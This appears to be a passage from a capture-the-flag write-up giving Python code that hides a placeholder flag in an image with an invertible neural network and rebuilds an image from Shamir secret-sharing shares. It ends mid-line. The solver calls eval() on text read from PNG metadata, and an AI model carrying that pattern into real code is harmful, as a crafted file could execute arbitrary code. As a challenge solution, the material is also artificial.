<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> Model</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> DWT, IWT, make_payload, auxiliary_variable, bits_to_bytearray, bytearray_to_text</span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> T</span><br><span class="line"></span><br><span class="line">transform_test = T.Compose([</span><br><span class="line">    T.ToTensor(),</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">name</span>):</span><br><span class="line">    state_dicts = torch.load(name)</span><br><span class="line">    network_state_dict = {k: v <span class="keyword">for</span> k, v <span class="keyword">in</span> state_dicts[<span class="string">'net'</span>].items() <span class="keyword">if</span> <span class="string">'tmp_var'</span> <span class="keyword">not</span> <span class="keyword">in</span> k}</span><br><span class="line">    simple_net.load_state_dict(network_state_dict)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform2tensor</span>(<span class="params">img</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(img)</span><br><span class="line">    img = img.convert(<span class="string">'RGB'</span>)</span><br><span class="line">    img = img.resize((<span class="number">600</span>, <span class="number">450</span>)) </span><br><span class="line">    <span class="keyword">return</span> transform_test(img).unsqueeze(<span class="number">0</span>).to(device)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">cover, text</span>):</span><br><span class="line">    cover = transform2tensor(cover)</span><br><span class="line">    B, C, H, W = cover.size()       </span><br><span class="line">    payload = make_payload(W, H, C, text, B)</span><br><span class="line">    payload = payload.to(device)</span><br><span class="line">    cover_input = dwt(cover)</span><br><span class="line">    payload_input = dwt(payload)        </span><br><span class="line">    input_img = torch.cat([cover_input, payload_input], dim=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad(): </span><br><span class="line">        output = simple_net(input_img)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">del</span> input_img  </span><br><span class="line">    torch.cuda.empty_cache()  </span><br><span class="line"></span><br><span class="line">    output_steg = output.narrow(<span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span> * <span class="number">3</span>)</span><br><span class="line">    output_img = iwt(output_steg)</span><br><span class="line">    torchvision.utils.save_image(output_img, <span class="string">'./secret.png'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    simple_net = Model()</span><br><span class="line">    load(<span class="string">'misuha.taki'</span>)</span><br><span class="line">    simple_net.<span class="built_in">eval</span>()</span><br><span class="line"></span><br><span class="line">    dwt = DWT()</span><br><span class="line">    iwt = IWT()</span><br><span class="line">    </span><br><span class="line">    device = torch.device(<span class="string">"cuda:0"</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">"cpu"</span>)</span><br><span class="line">    </span><br><span class="line">    text = <span class="string">r'flag{there_is_flag}'</span></span><br><span class="line">    steg = <span class="string">r'./secret.png'</span></span><br><span class="line">    cover = <span class="string">'./xxx.png'</span></span><br><span class="line">    encode(cover, text)</span><br></pre></td></tr></table></figure>
<p><img src="/images/image-20251209134911503.png" alt=""></p>
<p><img src="/images/image-20251209140404466.png" alt=""></p>
<p><img src="/images/image-20251209135517422.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.init <span class="keyword">as</span> init</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> png</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> T</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> reedsolo <span class="keyword">import</span> RSCodec, ReedSolomonError</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================= PART 1: 图片重组 (SSS Reconstruct) =================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_lagrange_coeffs</span>(<span class="params">n=<span class="number">6</span>, modulus=<span class="number">257</span></span>):</span><br><span class="line">    coeffs = []</span><br><span class="line">    x = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        x_j = x[j]</span><br><span class="line">        numerator = <span class="number">1</span></span><br><span class="line">        denominator = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">if</span> m == j:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            x_m = x[m]</span><br><span class="line">            numerator = (numerator * (-x_m)) % modulus</span><br><span class="line">            denominator = (denominator * (x_j - x_m)) % modulus</span><br><span class="line">        inv_denominator = <span class="built_in">pow</span>(denominator, -<span class="number">1</span>, modulus)</span><br><span class="line">        coeff = (numerator * inv_denominator) % modulus</span><br><span class="line">        coeffs.append(coeff)</span><br><span class="line">    <span class="keyword">return</span> coeffs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_text_chunk_fix</span>(<span class="params">src_png</span>):</span><br><span class="line">    <span class="string">"""读取PNG的tEXt块获取值为256的像素索引"""</span></span><br><span class="line">    indices = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        reader = png.Reader(filename=src_png)</span><br><span class="line">        <span class="comment"># 必须把 chunks 转为 list 才能遍历</span></span><br><span class="line">        chunks = <span class="built_in">list</span>(reader.chunks())</span><br><span class="line">        <span class="keyword">for</span> chunk_type, chunk_data <span class="keyword">in</span> chunks:</span><br><span class="line">            <span class="keyword">if</span> chunk_type == <span class="string">b'tEXt'</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="comment"># chunk_data 通常包含 keyword + \x00 + text，或者根据写入方式只有 text</span></span><br><span class="line">                    <span class="comment"># 我们尝试解码并寻找列表格式 "[...]"</span></span><br><span class="line">                    data_str = chunk_data.decode(<span class="string">'latin-1'</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">"["</span> <span class="keyword">in</span> data_str <span class="keyword">and</span> <span class="string">"]"</span> <span class="keyword">in</span> data_str:</span><br><span class="line">                        start = data_str.find(<span class="string">'['</span>)</span><br><span class="line">                        end = data_str.rfind(<span class="string">']'</span>) + <span class="number">1</span></span><br><span class="line">                        list_str = data_str[start:end]</span><br><span class="line">                        found = <span class="built_in">eval</span>(list_str)</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">isinstance</span>(found, <span class="built_in">list</span>):</span><br><span class="line">                            indices = found</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[-] Warning: Failed to parse chunks in <span class="subst">{src_png}</span>: <span class="subst">{e}</span>"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> indices</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reconstruct_image</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[*] Starting Image Reconstruction (Shamir Secret Sharing)..."</span>)</span><br><span class="line">    n = <span class="number">6</span></span><br><span class="line">    modulus = <span class="number">257</span></span><br><span class="line">    coeffs = get_lagrange_coeffs(n, modulus)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">"secret_1.png"</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[-] secret_1.png not found."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取尺寸</span></span><br><span class="line">    img1 = Image.<span class="built_in">open</span>(<span class="string">"secret_1.png"</span>)</span><br><span class="line">    img1_arr = np.asarray(img1)</span><br><span class="line">    flat_len = img1_arr.size</span><br><span class="line">    original_shape = img1_arr.shape</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># shares 容器</span></span><br><span class="line">    shares = np.zeros((n, flat_len), dtype=np.int32)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        fname = <span class="string">f"secret_<span class="subst">{i+<span class="number">1</span>}</span>.png"</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fname):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"[-] Missing <span class="subst">{fname}</span>"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            </span><br><span class="line">        img = Image.<span class="built_in">open</span>(fname)</span><br><span class="line">        data = np.asarray(img).flatten().astype(np.int32)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 修正 256</span></span><br><span class="line">        extra_indices = read_text_chunk_fix(fname)</span><br><span class="line">        <span class="keyword">if</span> extra_indices:</span><br><span class="line">            <span class="comment"># 过滤越界索引</span></span><br><span class="line">            valid_indices = [idx <span class="keyword">for</span> idx <span class="keyword">in</span> extra_indices <span class="keyword">if</span> idx &lt; flat_len]</span><br><span class="line">            data[valid_indices] = <span class="number">256</span></span><br><span class="line">            </span><br><span class="line">        shares[i] = data</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(extra_indices) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"    Loaded <span class="subst">{fname}</span>: fixed <span class="subst">{<span class="built_in">len</span>(extra_indices)}</span> pixels (256 values)."</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"    Loaded <span class="subst">{fname}</span>: no extra pixels found."</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[*] Calculating interpolation..."</span>)</span><br><span class="line">    reconstructed = np.zeros(flat_len, dtype=np.int32)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        term = (shares[i] * coeffs[i]) % modulus</span><br><span class="line">        reconstructed = (reconstructed + term) % modulus</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> np.<span class="built_in">any</span>(reconstructed &gt; <span class="number">255</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[-] Warning: Some pixels &gt; 255 after reconstruction. Clipping."</span>)</span><br><span class="line">        reconstructed = np.clip(reconstructed, <span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">        </span><br><span class="line">    reconstructed = reconstructed.astype(np.uint8).reshape(original_shape)</span><br><span class="line">    save_path = <span class="string">"secret_restored.png"</span></span><br><span class="line">    Image.fromarray(reconstructed).save(save_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[+] Reconstructed image saved to <span class="subst">{save_path}</span>"</span>)</span><br><span class="line">    <span class="keyword">return</span> save_path</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================= PART 2: 深度学习模型 =================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ResidualDenseBlock_out</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, bias=<span class="literal">True</span></span>):</span><br><span class="line">        <span class="built_in">super</span>(ResidualDenseBlock_out, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.channel = <span class="number">12</span></span><br><span class="line">        <span class="variable language_">self</span>.hidden_size = <span class="number">32</span></span><br><span class="line">        <span class="variable language_">self</span>.conv1 = nn.Conv2d(<span class="variable language_">self</span>.channel, <span class="variable language_">self</span>.hidden_size, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=bias)</span><br><span class="line">        <span class="variable language_">self</span>.conv2 = nn.Conv2d(<span class="variable language_">self</span>.channel + <span class="variable language_">self</span>.hidden_size, <span class="variable language_">self</span>.hidden_size, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=bias)</span><br><span class="line">        <span class="variable language_">self</span>.conv3 = nn.Conv2d(<span class="variable language_">self</span>.channel + <span class="number">2</span> * <span class="variable language_">self</span>.hidden_size, <span class="variable language_">self</span>.hidden_size, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=bias)</span><br><span class="line">        <span class="variable language_">self</span>.conv4 = nn.Conv2d(<span class="variable language_">self</span>.channel + <span class="number">3</span> * <span class="variable language_">self</span>.hidden_size, <span class="variable language_">self</span>.hidden_size, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=bias)</span><br><span class="line">        <span class="variable language_">self</span>.conv5 = nn.Conv2d(<span class="variable language_">self</span>.channel + <span class="number">4</span> * <span class="variable language_">self</span>.hidden_size, <span class="variable language_">self</span>.channel, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=bias)</span><br><span class="line">        <span class="variable language_">self</span>.lrelu = nn.LeakyReLU(inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x1 = <span class="variable language_">self</span>.lrelu(<span class="variable language_">self</span>.conv1(x))</span><br><span class="line">        x2 = <span class="variable language_">self</span>.lrelu(<span class="variable language_">self</span>.conv2(torch.cat((x, x1), <span class="number">1</span>)))</span><br><span class="line">        x3 = <span class="variable language_">self</span>.lrelu(<span class="variable language_">self</span>.conv3(torch.cat((x, x1, x2), <span class="number">1</span>)))</span><br><span class="line">        x4 = <span class="variable language_">self</span>.lrelu(<span class="variable language_">self</span>.conv4(torch.cat((x, x1, x2, x3), <span class="number">1</span>)))</span><br><span class="line">        x5 = <span class="variable language_">self</span>.conv5(torch.cat((x, x1, x2, x3, x4), <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> x5</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">INV_block</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, clamp=<span class="number">2.0</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.channels = <span class="number">3</span></span><br><span class="line">        <span class="variable language_">self</span>.clamp = clamp</span><br><span class="line">        <span class="variable language_">self</span>.r = ResidualDenseBlock_out()</span><br><span class="line">        <span class="variable language_">self</span>.y = ResidualDenseBlock_out()</span><br><span class="line">        <span class="variable language_">self</span>.f = ResidualDenseBlock_out()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">e</span>(<span class="params">self, s</span>):</span><br><span class="line">        <span class="keyword">return</span> torch.exp(<span class="variable language_">self</span>.clamp * <span class="number">2</span> * (torch.sigmoid(s) - <span class="number">0.5</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x1, x2 = x.narrow(<span class="number">1</span>, <span class="number">0</span>, <span class="variable language_">self</span>.channels*<span class="number">4</span>), x.narrow(<span class="number">1</span>, <span class="variable language_">self</span>.channels*<span class="number">4</span>, <span class="variable language_">self</span>.channels*<span class="number">4</span>)</span><br><span class="line">        t2 = <span class="variable language_">self</span>.f(x2)</span><br><span class="line">        y1 = x1 + t2</span><br><span class="line">        s1, t1 = <span class="variable language_">self</span>.r(y1), <span class="variable language_">self</span>.y(y1)</span><br><span class="line">        y2 = <span class="variable language_">self</span>.e(s1) * x2 + t1</span><br><span class="line">        <span class="keyword">return</span> torch.cat((y1, y2), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inverse</span>(<span class="params">self, x</span>):</span><br><span class="line">        y1, y2 = x.narrow(<span class="number">1</span>, <span class="number">0</span>, <span class="variable language_">self</span>.channels*<span class="number">4</span>), x.narrow(<span class="number">1</span>, <span class="variable language_">self</span>.channels*<span class="number">4</span>, <span class="variable language_">self</span>.channels*<span class="number">4</span>)</span><br><span class="line">        s1, t1 = <span class="variable language_">self</span>.r(y1), <span class="variable language_">self</span>.y(y1)</span><br><span class="line">        x2 = (y2 - t1) / <span class="variable language_">self</span>.e(s1)</span><br><span class="line">        t2 = <span class="variable language_">self</span>.f(x2)</span><br><span class="line">        x1 = y1 - t2</span><br><span class="line">        <span class="keyword">return</span> torch.cat((x1, x2), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">simple_net</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(simple_net, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.inv1 = INV_block()</span><br><span class="line">        <span class="variable language_">self</span>.inv2 = INV_block()</span><br><span class="line">        <span class="variable language_">self</span>.inv3 = INV_block()</span><br><span class="line">        <span class="variable language_">self</span>.inv4 = INV_block()</span><br><span class="line">        <span class="variable language_">self</span>.inv5 = INV_block()</span><br><span class="line">        <span class="variable language_">self</span>.inv6 = INV_block()</span><br><span class="line">        <span class="variable language_">self</span>.inv7 = INV_block()</span><br><span class="line">        <span class="variable language_">self</span>.inv8 = INV_block()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        out = <span class="variable language_">self</span>.inv1(x)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv2(out)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv3(out)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv4(out)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv5(out)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv6(out)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv7(out)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv8(out)</span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">reverse</span>(<span class="params">self, x</span>):</span><br><span class="line">        out = <span class="variable language_">self</span>.inv8.inverse(x)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv7.inverse(out)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv6.inverse(out)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv5.inverse(out)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv4.inverse(out)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv3.inverse(out)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv2.inverse(out)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv1.inverse(out)</span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DWT</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(DWT, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.requires_grad = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x01 = x[:, :, <span class="number">0</span>::<span class="number">2</span>, :] / <span class="number">2</span></span><br><span class="line">        x02 = x[:, :, <span class="number">1</span>::<span class="number">2</span>, :] / <span class="number">2</span></span><br><span class="line">        x1 = x01[:, :, :, <span class="number">0</span>::<span class="number">2</span>]</span><br><span class="line">        x2 = x02[:, :, :, <span class="number">0</span>::<span 